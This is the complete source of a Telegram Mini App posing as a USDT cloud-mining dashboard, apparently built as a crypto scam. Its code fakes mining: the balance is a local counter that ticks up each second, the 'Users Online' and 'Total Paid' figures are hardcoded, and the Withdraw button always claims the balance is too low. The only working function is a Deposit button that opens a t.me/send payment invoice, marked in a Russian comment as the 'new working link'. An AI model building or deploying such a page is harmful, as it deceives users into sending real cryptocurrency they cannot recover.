<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; margin: 0; padding: 20px; overflow: hidden; user-select: none; }
        .balance { font-size: 48px; font-weight: bold; margin-top: 50px; color: #fff; }
        .usdt { font-size: 18px; color: #888; margin-bottom: 10px; }
        .stat-card { display: flex; justify-content: space-around; background: #111; padding: 15px; border-radius: 15px; margin: 25px 0; border: 1px solid #222; }
        .stat-item { text-align: center; }
        .stat-label { color: #888; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 5px; }
        .stat-value { color: #fff; font-weight: bold; font-size: 16px; }
        .divider { width: 1px; background: #222; }
        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; margin-bottom: 10px; cursor: pointer; transition: 0.2s; }
        button:active { transform: scale(0.98); opacity: 0.8; }
        .btn-withdraw { background: #1a1a1a; color: #555; }
    </style>
</head>
<body>
    <div class="usdt">USDT BALANCE</div>
    <div class="balance" id="balance">0.000000</div>
    <div style="color: #00ff88; font-size: 14px; margin-top: 5px;">● Mining Active: 1.25 TH/s</div>

    <div class="stat-card">
        <div class="stat-item">
            <span class="stat-label">Users Online</span>
            <span class="stat-value">4,281</span>
        </div>
        <div class="divider"></div>
        <div class="stat-item">
            <span class="stat-label">Total Paid</span>
            <span class="stat-value" style="color: #00ff88;">1,150 USDT</span>
        </div>
    </div>

    <button onclick="deposit()">DEPOSIT</button>
    <button class="btn-withdraw" onclick="tg.showAlert('Минимальная сумма вывода — 10 USDT. На вашем балансе пока недостаточно средств.')">WITHDRAW</button>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let bal = parseFloat(localStorage.getItem('m_bal')) || 0.000000;

        setInterval(() => {
            bal += 0.000001;
            document.getElementById('balance').innerText = bal.toFixed(6);
            localStorage.setItem('m_bal', bal);
        }, 1000);

        function deposit() {
            tg.showConfirm("Создать счет на пополнение?", (confirm) => {
                if (confirm) {
                    // Твоя НОВАЯ рабочая ссылка
                    tg.openTelegramLink("http://t.me/send?start=IVubelJ5G9NB");
                }
            });
        }
    </script>
</body>
</html>
